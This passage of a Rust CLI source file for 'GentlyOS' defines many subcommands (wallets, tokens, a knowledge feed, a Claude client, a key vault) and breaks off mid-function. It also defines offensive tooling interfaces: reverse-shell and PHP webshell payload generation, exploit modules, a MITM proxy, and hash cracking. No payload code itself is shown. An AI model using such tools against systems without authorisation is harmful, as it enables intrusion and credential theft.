//! GentlyOS CLI
//!
//! Command-line interface for the GentlyOS security system.

mod report;

use clap::{Parser, Subcommand};
use anyhow::Result;
use sha2::{Sha256, Digest};

use gently_core::{GenesisKey, PatternEncoder, Lock, Key, KeyVault, ServiceConfig};
use gently_core::crypto::xor::split_secret;
use gently_feed::{FeedStorage, ItemKind, LivingFeed};
use gently_search::{ContextRouter, Thought, ThoughtIndex};
use gently_mcp::{McpServer, McpHandler};
use gently_dance::{DanceSession, Contract};
use gently_visual::VisualEngine;

// New crate imports
use gently_cipher::{CipherType, Cipher, Encoding, Hashes, HashIdentifier, CipherIdentifier};
use gently_cipher::analysis::FrequencyAnalysis;
use gently_cipher::{Cracker, RainbowTable, RainbowHashType, TableGenerator, Wordlist, BruteForce};
use gently_network::{PacketCapture, ProxyConfig, ProxyHistory, Repeater, NetworkVisualizer};
use gently_network::capture::{filters, display_filters};
use gently_architect::{IdeaCrystal, ProjectTree, FlowChart, RecallEngine};
use gently_brain::{ModelDownloader, Embedder, LlamaInference, TensorChain, ClaudeClient, ClaudeModel, GentlyAssistant};
use gently_ipfs::{IpfsClient, IpfsOperations, PinStrategy};
use gently_sploit::{Framework, SploitConsole, ShellPayload, console::banner};
use gently_spl::{
    GentlyNft, GentlyWallet, WalletStore, Network,
    GntlyToken, TokenAmount, CertificationManager,
    PermissionManager, AuditType,
    Installer, GentlyInstall, GosToken, OwnerType,
    GovernanceSystem, GovernanceLevel, ROOT_TOKEN_AMOUNT, ADMIN_TOKEN_COUNT,
    GenosEconomy, GenosAmount, ContributionType, GpuJobType,
};

#[derive(Parser)]
#[command(name = "gently")]
#[command(about = "GentlyOS - Cryptographic security with visual-audio authentication")]
#[command(version)]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// Install GentlyOS - initialize filesystem with wallets and GOS token
    Install {
        /// Total stake supply in GOS tokens
        #[arg(short, long, default_value = "1000")]
        stake: f64,

        /// Network (devnet, testnet, mainnet)
        #[arg(short, long, default_value = "devnet")]
        network: String,

        /// Seed phrase for deterministic genesis
        #[arg(long)]
        seed: Option<String>,

        /// Output installation JSON to file
        #[arg(short, long)]
        output: Option<String>,
    },

    /// Generate a new genesis key
    Init {
        /// Optional seed phrase for recovery
        #[arg(short, long)]
        seed: Option<String>,

        /// Salt for seed derivation
        #[arg(long, default_value = "gently-default")]
        salt: String,
    },

    /// Create a new project with Lock/Key pair
    Create {
        /// Project name
        name: String,

        /// Description
        #[arg(short, long, default_value = "")]
        description: String,

        /// BTC block height for expiry (optional)
        #[arg(long)]
        expires: Option<u64>,
    },

    /// Generate visual pattern from a hash
    Pattern {
        /// Hex-encoded hash (64 chars)
        hash: String,

        /// Output SVG file
        #[arg(short, long)]
        output: Option<String>,
    },

    /// Split a secret into Lock + Key
    Split {
        /// Hex-encoded secret (64 chars)
        secret: String,
    },

    /// Combine Lock + Key to recover secret
    Combine {
        /// Hex-encoded lock (64 chars)
        lock: String,

        /// Hex-encoded key (64 chars)
        key: String,
    },

    /// Mint an NFT containing a KEY
    Mint {
        /// Project name to mint for
        project: String,

        /// Visual URI (IPFS, HTTP, etc)
        #[arg(short, long, default_value = "ipfs://placeholder")]
        visual: String,
    },

    /// Show system status
    Status,

    /// Demo the dance protocol (simulation)
    Demo,

    // ===== WALLET COMMANDS =====

    /// Generate a new GentlyOS wallet (locked to genesis key)
    Wallet {
        #[command(subcommand)]
        command: WalletCommands,
    },

    /// GNTLY token operations
    Token {
        #[command(subcommand)]
        command: TokenCommands,
    },

    /// Certification via Dance (devnet token swap)
    Certify {
        #[command(subcommand)]
        command: CertifyCommands,
    },

    /// Hierarchical permission stake system
    Perm {
        #[command(subcommand)]
        command: PermCommands,
    },

    /// GENOS - Proof-of-Thought token (valuable token for AI/GPU)
    Genos {
        #[command(subcommand)]
        command: GenosCommands,
    },

    /// Living Feed - self-tracking context system
    Feed {
        #[command(subcommand)]
        command: FeedCommands,
    },

    /// Thought Index - semantic search and knowledge base
    Search {
        #[command(subcommand)]
        command: SearchCommands,
    },

    /// MCP Server - Claude integration via Model Context Protocol
    Mcp {
        #[command(subcommand)]
        command: McpCommands,
    },

    /// Cipher-Mesh - Cipher identification, encoding/decoding, cryptanalysis
    Cipher {
        #[command(subcommand)]
        command: CipherCommands,
    },

    /// Network security - packet capture, MITM proxy, visualization
    Network {
        #[command(subcommand)]
        command: NetworkCommands,
    },

    /// Brain - Local LLM, embeddings, TensorChain
    Brain {
        #[command(subcommand)]
        command: BrainCommands,
    },

    /// Architect - Idea crystallization, flowcharts, recall engine
    Architect {
        #[command(subcommand)]
        command: ArchitectCommands,
    },

    /// IPFS - Decentralized storage operations
    Ipfs {
        #[command(subcommand)]
        command: IpfsCommands,
    },

    /// Sploit - Exploitation framework (authorized testing only)
    Sploit {
        #[command(subcommand)]
        command: SploitCommands,
    },

    /// Crack - Password cracking tools
    Crack {
        #[command(subcommand)]
        command: CrackCommands,
    },

    /// Claude - AI assistant powered by Anthropic
    Claude {
        #[command(subcommand)]
        command: ClaudeCommands,
    },

    /// Vault - Encrypted API key storage in IPFS
    Vault {
        #[command(subcommand)]
        command: VaultCommands,
    },

    /// Interactive TUI dashboard report
    Report,
}

#[derive(Subcommand)]
enum ClaudeCommands {
    /// Chat with Claude (conversational)
    Chat {
        /// Your message
        message: String,

        /// Model: sonnet, opus, haiku
        #[arg(short, long, default_value = "sonnet")]
        model: String,
    },

    /// Ask Claude a one-off question (no history)
    Ask {
        /// Your question
        question: String,

        /// Model: sonnet, opus, haiku
        #[arg(short, long, default_value = "sonnet")]
        model: String,
    },

    /// Interactive REPL session with Claude
    Repl {
        /// Model: sonnet, opus, haiku
        #[arg(short, long, default_value = "sonnet")]
        model: String,

        /// System prompt override
        #[arg(short, long)]
        system: Option<String>,
    },

    /// Show Claude status and configuration
    Status,
}

#[derive(Subcommand)]
enum VaultCommands {
    /// Add or update an API key
    Set {
        /// Service name (anthropic, openai, github, etc.)
        service: String,
        /// API key value
        key: String,
    },

    /// Get an API key (outputs to stdout)
    Get {
        /// Service name
        service: String,
        /// Also export to environment variable
        #[arg(short, long)]
        export: bool,
    },

    /// Remove an API key
    Remove {
        /// Service name
        service: String,
    },

    /// List all stored services
    List,

    /// Export all keys to environment
    Export,

    /// Save vault to IPFS
    Save,

    /// Load vault from IPFS
    Load {
        /// IPFS CID of vault
        cid: String,
    },

    /// Show vault status
    Status,

    /// Show known services
    Services,
}

#[derive(Subcommand)]
enum WalletCommands {
    /// Create a new wallet from genesis key
    Create {
        /// Network (devnet, testnet, mainnet)
        #[arg(short, long, default_value = "devnet")]
        network: String,

        /// Seed phrase for genesis key
        #[arg(short, long)]
        seed: Option<String>,
    },

    /// Show wallet info
    Info {
        /// Wallet file path
        #[arg(short, long, default_value = "~/.gently/wallet.json")]
        file: String,
    },

    /// Export wallet public key
    Pubkey,

    /// Sign a message
    Sign {
        /// Message to sign
        message: String,
    },
}

#[derive(Subcommand)]
enum TokenCommands {
    /// Show GNTLY balance
    Balance {
        /// Wallet pubkey (optional, uses local wallet if not provided)
        pubkey: Option<String>,
    },

    /// Airdrop GNTLY tokens (devnet only)
    Airdrop {
        /// Amount in GNTLY
        #[arg(short, long, default_value = "100")]
        amount: f64,
    },

    /// Transfer GNTLY tokens
    Transfer {
        /// Recipient pubkey
        to: String,

        /// Amount in GNTLY
        amount: f64,
    },

    /// Stake GNTLY for hive access
    Stake {
        /// Amount in GNTLY
        amount: f64,
    },

    /// Show token info
    Info,
}

#[derive(Subcommand)]
enum CertifyCommands {
    /// Initialize a Dance certification with another device
    Init {
        /// Other device's pubkey
        peer: String,
    },

    /// Complete a Dance certification
    Complete {
        /// Session hash (hex)
        session: String,
    },

    /// Abort a Dance certification
    Abort {
        /// Session hash (hex)
        session: String,
    },

    /// Show certification history
    History,

    /// Show certification pricing info
    Info,
}

#[derive(Subcommand)]
enum PermCommands {
    /// Initialize permission tree with root stake
    Init {
        /// Total stake in GNTLY
        #[arg(short, long, default_value = "100")]
        stake: f64,
    },

    /// Add a path to the permission tree
    Add {
        /// Path to add (e.g., /home/user)
        path: String,

        /// Owner pubkey (defaults to self)
        #[arg(short, long)]
        owner: Option<String>,

        /// Is this a directory?
        #[arg(short, long, default_value = "true")]
        dir: bool,
    },

    /// Attempt to edit a path
    Edit {
        /// Path to edit
        path: String,
    },

    /// Show stake hierarchy
    Tree,

    /// Show audit history
    Audits,

    /// Check system health (audit balance)
    Health,

    /// Show permission system info
    Info,
}

#[derive(Subcommand)]
enum GenosCommands {
    /// Show GENOS balance
    Balance,

    /// Submit a contribution for GENOS reward
    Contribute {
        /// Contribution type (thought, report, code, research, design)
        #[arg(short, long, default_value = "thought")]
        kind: String,

        /// Title/summary
        title: String,
    },

    /// Register as GPU provider
    GpuRegister {
        /// GPU model name
        model: String,

        /// VRAM in GB
        #[arg(short, long)]
        vram: u32,

        /// Hourly rate in GENOS
        #[arg(short, long, default_value = "1.0")]
        rate: f64,
    },

    /// Submit GPU job
    GpuJob {
        /// Job type (inference, training, finetuning, embedding)
        #[arg(short, long, default_value = "inference")]
        kind: String,

        /// Estimated hours
        #[arg(short, long, default_value = "1.0")]
        hours: f32,

        /// GENOS budget
        #[arg(short, long, default_value = "5.0")]
        budget: f64,
    },

    /// Add vector chain contribution
    Vector {
        /// Metadata/description
        metadata: String,
    },

    /// Show GENOS economy stats
    Stats,

    /// Show GENOS token info
    Info,
}

#[derive(Subcommand)]
enum FeedCommands {
    /// Show current Living Feed state
    Show {
        /// Filter: hot, active, cooling, frozen, all
        #[arg(short, long, default_value = "all")]
        filter: String,
    },

    /// Add a new item to the feed
    Add {
        /// Item name
        name: String,

        /// Item kind (project, task, idea, reference)
        #[arg(short, long, default_value = "project")]
        kind: String,

        /// Tags (comma-separated)
        #[arg(short, long)]
        tags: Option<String>,
    },

    /// Boost an item's charge
    Boost {
        /// Item name to boost
        name: String,

        /// Boost amount (0.1-1.0)
        #[arg(short, long, default_value = "0.3")]
        amount: f32,
    },

    /// Add a step to an item
    Step {
        /// Item name
        item: String,

        /// Step content
        step: String,
    },

    /// Mark a step as done
    Done {
        /// Item name
        item: String,

        /// Step number
        step_id: u32,
    },

    /// Freeze an item
    Freeze {
        /// Item name
        name: String,
    },

    /// Archive an item
    Archive {
        /// Item name
        name: String,
    },

    /// Process text for mentions and context
    Process {
        /// Text to process
        text: String,
    },

    /// Export feed to markdown
    Export {
        /// Output file
        #[arg(short, long)]
        output: Option<String>,
    },
}

#[derive(Subcommand)]
enum SearchCommands {
    /// Add a thought to the index
    Add {
        /// Thought content
        content: String,

        /// Source (optional)
        #[arg(short, long)]
        source: Option<String>,

        /// Tags (comma-separated)
        #[arg(short, long)]
        tags: Option<String>,
    },

    /// Search the thought index
    Query {
        /// Search query
        query: String,

        /// Maximum results
        #[arg(short, long, default_value = "10")]
        limit: usize,

        /// Use feed context for boosting
        #[arg(long)]
        feed: bool,
    },

    /// Show index statistics
    Stats,

    /// Show recent thoughts
    Recent {
        /// Number of thoughts
        #[arg(short, long, default_value = "10")]
        limit: usize,
    },

    /// Show thoughts in a domain
    Domain {
        /// Domain index (0-71)
        domain: u8,
    },
}

#[derive(Subcommand)]
enum McpCommands {
    /// Start MCP server (stdio mode)
    Serve,

    /// List available MCP tools
    Tools,

    /// Show MCP server info
    Info,
}

#[derive(Subcommand)]
enum CipherCommands {
    /// Identify cipher/encoding/hash type
    Identify {
        /// Input string to identify
        input: String,
    },

    /// Encode text with various algorithms
    Encode {
        /// Encoding type: base64, hex, binary, morse, rot13, rot47, url
        #[arg(short, long)]
        algo: String,

        /// Text to encode
        text: String,
    },

    /// Decode text with various algorithms
    Decode {
        /// Encoding type: base64, hex, binary, morse, rot13, rot47, url
        #[arg(short, long)]
        algo: String,

        /// Text to decode
        text: String,
    },

    /// Encrypt with classic ciphers
    Encrypt {
        /// Cipher: caesar, vigenere, atbash, affine, railfence, xor
        #[arg(short, long)]
        cipher: String,

        /// Key or shift value
        #[arg(short, long)]
        key: String,

        /// Text to encrypt
        text: String,
    },

    /// Decrypt with classic ciphers
    Decrypt {
        /// Cipher: caesar, vigenere, atbash, affine, railfence, xor
        #[arg(short, long)]
        cipher: String,

        /// Key or shift value
        #[arg(short, long)]
        key: String,

        /// Text to decrypt
        text: String,
    },

    /// Brute force Caesar cipher
    Bruteforce {
        /// Ciphertext
        text: String,
    },

    /// Hash data with various algorithms
    Hash {
        /// Algorithm: md5, sha1, sha256, sha512, all
        #[arg(short, long, default_value = "all")]
        algo: String,

        /// Data to hash
        data: String,
    },

    /// Frequency analysis
    Analyze {
        /// Text to analyze
        text: String,

        /// Show ASCII chart
        #[arg(long)]
        chart: bool,
    },
}

#[derive(Subcommand)]
enum NetworkCommands {
    /// List network interfaces
    Interfaces,

    /// Capture packets (requires tshark)
    Capture {
        /// Interface name
        #[arg(short, long)]
        interface: String,

        /// BPF filter
        #[arg(short, long)]
        filter: Option<String>,

        /// Number of packets to capture
        #[arg(short, long)]
        count: Option<usize>,

        /// Output pcap file
        #[arg(short, long)]
        output: Option<String>,
    },

    /// Read pcap file
    Read {
        /// PCAP file path
        file: String,

        /// Display filter (Wireshark syntax)
        #[arg(short, long)]
        filter: Option<String>,
    },

    /// Extract HTTP requests from pcap
    HttpExtract {
        /// PCAP file path
        file: String,
    },

    /// Extract DNS queries from pcap
    DnsExtract {
        /// PCAP file path
        file: String,
    },

    /// Start MITM proxy
    Proxy {
        /// Listen port
        #[arg(short, long, default_value = "8080")]
        port: u16,

        /// Intercept mode: passthrough, intercept
        #[arg(short, long, default_value = "passthrough")]
        mode: String,
    },

    /// HTTP repeater - replay requests
    Repeat {
        /// Request file (raw HTTP)
        request: String,

        /// Target URL
        #[arg(short, long)]
        url: Option<String>,
    },

    /// Visualize network topology
    Visualize {
        /// Output SVG file
        #[arg(short, long)]
        output: Option<String>,
    },

    /// Show common BPF filters
    Filters,
}

#[derive(Subcommand)]
enum BrainCommands {
    /// Download models from HuggingFace
    Download {
        /// Model: llama-1b, embedder
        #[arg(short, long, default_value = "llama-1b")]
        model: String,
    },

    /// Embed text to vector
    Embed {
        /// Text to embed
        text: String,
    },

    /// Run local inference
    Infer {
        /// Prompt
        prompt: String,

        /// Max tokens
        #[arg(short, long, default_value = "256")]
        max_tokens: usize,
    },

    /// TensorChain - add code memory
    Learn {
        /// Code or concept to learn
        content: String,

        /// Category
        #[arg(short, long, default_value = "code")]
        category: String,
    },

    /// TensorChain - query knowledge
    Query {
        /// Query string
        query: String,

        /// Number of results
        #[arg(short, long, default_value = "5")]
        limit: usize,
    },

    /// Show brain status
    Status,

    /// Start the brain orchestrator (awareness loop + daemons)
    Orchestrate {
        /// Enable IPFS sync
        #[arg(long, default_value = "false")]
        ipfs: bool,

        /// Show daemon events
        #[arg(long, default_value = "false")]
        verbose: bool,
    },

    /// List available skills
    Skills {
        /// Filter by category
        #[arg(short, long)]
        category: Option<String>,
    },

    /// List available MCP tools
    Tools {
        /// Filter by category
        #[arg(short, long)]
        category: Option<String>,
    },

    /// Manage background daemons
    Daemon {
        #[command(subcommand)]
        action: DaemonAction,
    },

    /// Knowledge graph operations
    Knowledge {
        #[command(subcommand)]
        action: KnowledgeAction,
    },

    /// Process a thought through the awareness loop
    Think {
        /// The thought to process
        thought: String,
    },

    /// Focus attention on a topic
    Focus {
        /// Topic to focus on
        topic: String,
    },

    /// Trigger growth in a domain
    Grow {
        /// Domain to grow in
        domain: String,
    },

    /// Get current awareness state
    Awareness,
}

#[derive(Subcommand)]
enum DaemonAction {
    /// List running daemons
    List,
    /// Spawn a new daemon
    Spawn {
        /// Daemon type: vector_chain, ipfs_sync, git_branch, knowledge_graph, awareness, inference
        daemon_type: String,
    },
    /// Stop a daemon
    Stop {
        /// Daemon name
        name: String,
    },
    /// Get daemon metrics
    Metrics {
        /// Daemon name
        name: String,
    },
}

#[derive(Subcommand)]
enum KnowledgeAction {
    /// Add knowledge
    Add {
        /// Concept name
        concept: String,
        /// Context/content
        #[arg(short, long)]
        context: Option<String>,
    },
    /// Search knowledge
    Search {
        /// Query string
        query: String,
        /// Depth of related nodes to fetch
        #[arg(short, long, default_value = "1")]
        depth: usize,
    },
    /// Infer new knowledge
    Infer {
        /// Starting concept
        premise: String,
        /// Max inference steps
        #[arg(short, long, default_value = "3")]
        steps: usize,
    },
    /// Find similar concepts
    Similar {
        /// Concept to find similar to
        concept: String,
        /// Number of results
        #[arg(short, long, default_value = "5")]
        count: usize,
    },
    /// Export knowledge graph
    Export {
        /// Output file (JSON)
        #[arg(short, long, default_value = "knowledge.json")]
        output: String,
    },
    /// Show graph stats
    Stats,
}

#[derive(Subcommand)]
enum ArchitectCommands {
    /// Create a new idea
    Idea {
        /// Idea content
        content: String,

        /// Project context
        #[arg(short, long)]
        project: Option<String>,
    },

    /// Confirm an idea (embed it)
    Confirm {
        /// Idea ID
        id: String,
    },

    /// Crystallize an idea (finalize)
    Crystallize {
        /// Idea ID
        id: String,
    },

    /// Create flowchart
    Flow {
        /// Flowchart name
        name: String,

        /// Export format: ascii, svg
        #[arg(short, long, default_value = "ascii")]
        format: String,
    },

    /// Add node to flowchart
    Node {
        /// Flowchart name
        flow: String,

        /// Node label
        label: String,

        /// Node type: process, decision, io, start, end
        #[arg(short, long, default_value = "process")]
        kind: String,
    },

    /// Add edge to flowchart
    Edge {
        /// Flowchart name
        flow: String,

        /// From node ID
        from: String,

        /// To node ID
        to: String,

        /// Edge label
        #[arg(short, long)]
        label: Option<String>,
    },

    /// Show project tree
    Tree {
        /// Root path
        #[arg(short, long, default_value = ".")]
        path: String,
    },

    /// Query recall engine
    Recall {
        /// Query
        query: String,
    },

    /// Export session
    Export {
        /// Output file
        #[arg(short, long)]
        output: Option<String>,
    },
}

#[derive(Subcommand)]
enum IpfsCommands {
    /// Add file to IPFS
    Add {
        /// File path
        file: String,

        /// Pin locally
        #[arg(short, long)]
        pin: bool,
    },

    /// Get file from IPFS
    Get {
        /// CID
        cid: String,

        /// Output file
        #[arg(short, long)]
        output: Option<String>,
    },

    /// Pin content
    Pin {
        /// CID to pin
        cid: String,

        /// Remote pinning service
        #[arg(short, long)]
        remote: Option<String>,
    },

    /// List pinned content
    Pins,

    /// Store thought to IPFS
    StoreThought {
        /// Thought content
        content: String,

        /// Tags (comma-separated)
        #[arg(short, long)]
        tags: Option<String>,
    },

    /// Retrieve thought from IPFS
    GetThought {
        /// CID
        cid: String,
    },

    /// Show IPFS node status
    Status,
}

#[derive(Subcommand)]
enum SploitCommands {
    /// Start interactive console (msfconsole style)
    Console,

    /// Search for modules
    Search {
        /// Search query
        query: String,
    },

    /// Generate shell payload
    Payload {
        /// Payload type: reverse_bash, reverse_python, webshell_php
        #[arg(short, long, default_value = "reverse_bash")]
        payload_type: String,

        /// Local host for reverse shell
        #[arg(short = 'H', long)]
        lhost: Option<String>,

        /// Local port for reverse shell
        #[arg(short = 'P', long, default_value = "4444")]
        lport: u16,

        /// Target OS: linux, windows, macos
        #[arg(short, long, default_value = "linux")]
        os: String,
    },

    /// Generate listener command
    Listener {
        /// Port to listen on
        #[arg(short, long, default_value = "4444")]
        port: u16,
    },

    /// Scan target for vulnerabilities
    Scan {
        /// Target host
        target: String,

        /// Scan type: port, service, vuln
        #[arg(short, long, default_value = "port")]
        scan_type: String,
    },

    /// Run exploit module
    Exploit {
        /// Module name
        module: String,

        /// Target host
        #[arg(short, long)]
        target: Option<String>,
    },

    /// Show available exploits
    List {
        /// Category: http, ssh, smb, local
        #[arg(short, long)]
        category: Option<String>,
    },
}

#[derive(Subcommand)]
enum CrackCommands {
    /// Dictionary attack on hash
    Dictionary {
        /// Hash to crack
        hash: String,

        /// Wordlist file
        #[arg(short, long)]
        wordlist: Option<String>,

        /// Hash type: md5, sha1, sha256, ntlm, auto
        #[arg(short = 't', long, default_value = "auto")]
        hash_type: String,

        /// Use mutation rules
        #[arg(short, long)]
        rules: bool,
    },

    /// Bruteforce attack
    Bruteforce {
        /// Hash to crack
        hash: String,

        /// Character set: lower, alpha, alnum, all
        #[arg(short, long, default_value = "lower")]
        charset: String,

        /// Maximum length
        #[arg(short, long, default_value = "6")]
        max_len: usize,
    },

    /// Rainbow table lookup
    Rainbow {
        /// Hash to lookup
        hash: String,

        /// Hash type: md5, sha1, ntlm
        #[arg(short = 't', long, default_value = "md5")]
        hash_type: String,

        /// Rainbow table file
        #[arg(short, long)]
        table: Option<String>,
    },

    /// Generate rainbow table
    Generate {
        /// Output file
        output: String,

        /// Hash type: md5, sha1, ntlm
        #[arg(short = 't', long, default_value = "md5")]
        hash_type: String,

        /// Wordlist to hash
        #[arg(short, long)]
        wordlist: Option<String>,

        /// Generate numeric table (max digits)
        #[arg(short, long)]
        numeric: Option<usize>,
    },

    /// Show common passwords
    Wordlist,
}

fn main() -> Result<()> {
    let cli = Cli::parse();

    match cli.command {
        Commands::Install { stake, network, seed, output } => cmd_install(stake, network, seed, output),
        Commands::Init { seed, salt } => cmd_init(seed, salt),
        Commands::Create { name, description, expires } => cmd_create(name, description, expires),
        Commands::Pattern { hash, output } => cmd_pattern(hash, output),
        Commands::Split { secret } => cmd_split(secret),
        Commands::Combine { lock, key } => cmd_combine(lock, key),
        Commands::Mint { project, visual } => cmd_mint(project, visual),
        Commands::Status => cmd_status(),
        Commands::Demo => cmd_demo(),
        Commands::Wallet { command } => cmd_wallet(command),
        Commands::Token { command } => cmd_token(command),
        Commands::Certify { command } => cmd_certify(command),
        Commands::Perm { command } => cmd_perm(command),
        Commands::Genos { command } => cmd_genos(command),
        Commands::Feed { command } => cmd_feed(command),
        Commands::Search { command } => cmd_search(command),
        Commands::Mcp { command } => cmd_mcp(command),
        Commands::Cipher { command } => cmd_cipher(command),
        Commands::Network { command } => cmd_network(command),
        Commands::Brain { command } => cmd_brain(command),
        Commands::Architect { command } => cmd_architect(command),
        Commands::Ipfs { command } => cmd_ipfs(command),
        Commands::Sploit { command } => cmd_sploit(command),
        Commands::Crack { command } => cmd_crack(command),
        Commands::Claude { command } => cmd_claude(command),
        Commands::Vault { command } => cmd_vault(command),
        Commands::Report => {
            report::run_report().map_err(|e| anyhow::anyhow!("TUI error: {}", e))
        }
    }
}

// Global state for demo purposes (in production, use proper storage)
use std::sync::Mutex;

static DEMO_GENESIS: Mutex<Option<[u8; 32]>> = Mutex::new(None);
static DEMO_TOKEN: Mutex<Option<GntlyToken>> = Mutex::new(None);
static DEMO_CERTIFICATION: Mutex<Option<CertificationManager>> = Mutex::new(None);
static DEMO_PERMISSIONS: Mutex<Option<PermissionManager>> = Mutex::new(None);
static DEMO_INSTALL: Mutex<Option<GentlyInstall>> = Mutex::new(None);
static DEMO_GOS_TOKEN: Mutex<Option<GosToken>> = Mutex::new(None);
static DEMO_GOVERNANCE: Mutex<Option<GovernanceSystem>> = Mutex::new(None);
static DEMO_GENOS: Mutex<Option<GenosEconomy>> = Mutex::new(None);

fn get_demo_genesis() -> [u8; 32] {
    let mut guard = DEMO_GENESIS.lock().unwrap();
    if guard.is_none() {
        let mut genesis = [0u8; 32];
        rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut genesis);
        *guard = Some(genesis);
    }
    guard.unwrap()
}

fn with_demo_token<F, R>(f: F) -> R
where
    F: FnOnce(&mut GntlyToken) -> R,
{
    let mut guard = DEMO_TOKEN.lock().unwrap();
    if guard.is_none() {
        *guard = Some(GntlyToken::devnet());
    }
    f(guard.as_mut().unwrap())
}

fn with_demo_certification<F, R>(f: F) -> R
where
    F: FnOnce(&mut CertificationManager) -> R,
{
    let mut guard = DEMO_CERTIFICATION.lock().unwrap();
    if guard.is_none() {
        *guard = Some(CertificationManager::new());
    }
    f(guard.as_mut().unwrap())
}

fn with_demo_permissions<F, R>(f: F) -> Option<R>
where
    F: FnOnce(&mut PermissionManager) -> R,
{
    let mut guard = DEMO_PERMISSIONS.lock().unwrap();
    guard.as_mut().map(f)
}

fn init_demo_permissions(owner: &str, stake: TokenAmount) {
    let mut guard = DEMO_PERMISSIONS.lock().unwrap();
    *guard = Some(PermissionManager::new(owner, stake));
}

fn cmd_install(stake: f64, network_str: String, seed: Option<String>, output: Option<String>) -> Result<()> {
    let network = match network_str.as_str() {
        "devnet" => Network::Devnet,
        "testnet" => Network::Testnet,
        "mainnet" | "mainnet-beta" => Network::Mainnet,
        _ => anyhow::bail!("Unknown network: {}. Use devnet, testnet, or mainnet", network_str),
    };

    println!("\n  GENTLYOS INSTALLATION");
    println!("  ======================\n");

    // Generate or use provided genesis
    let genesis = match seed {
        Some(s) => {
            println!("  Using seed phrase for deterministic genesis...");
            GenesisKey::from_seed(&s, "gently-install")
        }
        None => {
            println!("  Generating random genesis key...");
            GenesisKey::generate()
        }
    };

    // Create governance system
    let mut gov_system = GovernanceSystem::new(genesis.as_bytes(), "CLI", network);
    gov_system.initialize_folders(genesis.as_bytes());

    // Store in demo state
    {
        let mut guard = DEMO_GENESIS.lock().unwrap();
        *guard = Some(*genesis.as_bytes());
    }
    {
        let mut guard = DEMO_GOVERNANCE.lock().unwrap();
        *guard = Some(gov_system.clone());
    }

    // Display TOKEN HIERARCHY
    println!("  TOKEN HIERARCHY");
    println!("  ================\n");

    println!("  LEVEL 0: ROOT [FROZEN]");
    println!("  ----------------------");
    println!("  Token:   {}", gov_system.root_wallet.token_id);
    println!("  Amount:  {} (IMMUTABLE)", ROOT_TOKEN_AMOUNT);
    println!("  Wallet:  {}...", &gov_system.root_wallet.pubkey[..24]);
    println!("  Purpose: LOCKS /gently/core - no file changes allowed");
    println!();

    println!("  LEVEL 1: DEVELOPER");
    println!("  ------------------");
    println!("  Token:   {}", gov_system.developer_wallet.token_id);
    println!("  Amount:  {} (holds ROOT tokens)", ROOT_TOKEN_AMOUNT);
    println!("  Wallet:  {}...", &gov_system.developer_wallet.pubkey[..24]);
    println!("  Purpose: Entry barrier to core OS operations");
    println!();

    println!("  LEVEL 2: ADMIN");
    println!("  ---------------");
    println!("  Token:   {}", gov_system.admin_wallet.token_id);
    println!("  Amount:  {} (distributes down)", ADMIN_TOKEN_COUNT);
    println!("  Wallet:  {}...", &gov_system.admin_wallet.pubkey[..24]);
    println!("  Purpose: Auto-swap on file ops, audit collection");
    println!();

    println!("  FOLDER WALLETS (1 token each, weighted by file size)");
    println!("  =====================================================\n");

    let hierarchy = gov_system.hierarchy_tree();
    for entry in hierarchy.iter().skip(3) { // Skip ROOT, DEV, ADMIN
        let indent = "  ".repeat(entry.depth.saturating_sub(2));
        let frozen = if entry.frozen { " [FROZEN]" } else { "" };
        let level_str = match entry.level {
            GovernanceLevel::Root => "ROOT",
            GovernanceLevel::Developer => "DEV ",
            GovernanceLevel::Admin => "ADM ",
            GovernanceLevel::System => "SYS ",
            GovernanceLevel::Service => "SVC ",
            GovernanceLevel::User => "USR ",
            GovernanceLevel::Guest => "GST ",
        };

        if let Some(path) = &entry.path {
            println!("  {}[{}] {}{}", indent, level_str, path, frozen);
            println!("  {}      Token: {}", indent, entry.token_id);
            println!("  {}      Wallet: {}...", indent, &entry.wallet[..20]);
        }
    }

    println!();
    println!("  GOVERNANCE RULES");
    println!("  =================");
    println!("  - ROOT (101010 tokens): FROZEN - core OS locked");
    println!("  - ADMIN (10 tokens): Collects/distributes on file ops");
    println!("  - FOLDERS: 1 token each, stake weighted by file size");
    println!("  - USERS: Fixed allocation, CANNOT accumulate more");
    println!();
    println!("  DECLINING GRADIENT:");
    println!("  -------------------");
    println!("  Root=100% -> Dev=90% -> Admin=70% -> System=50% -> User=10%");
    println!();
    println!("  All file operations trigger automatic token swaps for audit.");
    println!("  Frozen folders reject ALL operations.");

    // Save to file if requested
    if let Some(path) = output {
        let json = gov_system.to_json()
            .map_err(|e| anyhow::anyhow!("JSON export failed: {}", e))?;
        std::fs::write(&path, &json)?;
        println!();
        println!("  Installation saved to: {}", path);
    }

    println!();
    println!("  INSTALLATION COMPLETE");
    println!("  =====================");
    println!("  System ID: {}-{}", gov_system.token_gen.system_id, gov_system.token_gen.unit_id);
    println!("  Model: {}", gov_system.token_gen.model);
    println!("  Network: {:?}", network);
    println!("  Genesis: {:02x?}...", &genesis.as_bytes()[..8]);

    Ok(())
}

fn cmd_init(seed: Option<String>, salt: String) -> Result<()> {
    let genesis = match seed {
        Some(s) => {
            println!("Generating genesis key from seed phrase...");
            GenesisKey::from_seed(&s, &salt)
        }
        None => {
            println!("Generating random genesis key...");
            GenesisKey::generate()
        }
    };

    println!("\n  GENESIS KEY CREATED");
    println!("  Fingerprint: {:02x?}", genesis.fingerprint());
    println!("\n  Store this securely! It never leaves your device.");

    // In real implementation, we'd store in OS keychain
    let hex: String = genesis.as_bytes().iter().map(|b| format!("{:02x}", b)).collect();
    println!("\n  (Development mode - key in hex):");
    println!("  {}", hex);

    Ok(())
}

fn cmd_create(name: String, description: String, expires: Option<u64>) -> Result<()> {
    println!("Creating project: {}", name);

    // Generate project secret
    let mut secret = [0u8; 32];
    rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut secret);

    // Split into Lock + Key
    let (lock, key) = split_secret(&secret);

    println!("\n  PROJECT CREATED: {}", name);
    println!("  Description: {}", if description.is_empty() { "(none)" } else { &description });

    if let Some(exp) = expires {
        println!("  Expires at BTC block: {}", exp);
    }

    println!("\n  LOCK (stays on device):");
    let lock_hex: String = lock.as_bytes().iter().map(|b| format!("{:02x}", b)).collect();
    println!("  {}", lock_hex);

    println!("\n  KEY (can be distributed):");
    println!("  {}", key.to_hex());

    println!("\n  Remember: LOCK + KEY = ACCESS");
    println!("            Neither alone reveals anything.");

    Ok(())
}

fn cmd_pattern(hash: String, output: Option<String>) -> Result<()> {
    if hash.len() != 64 {
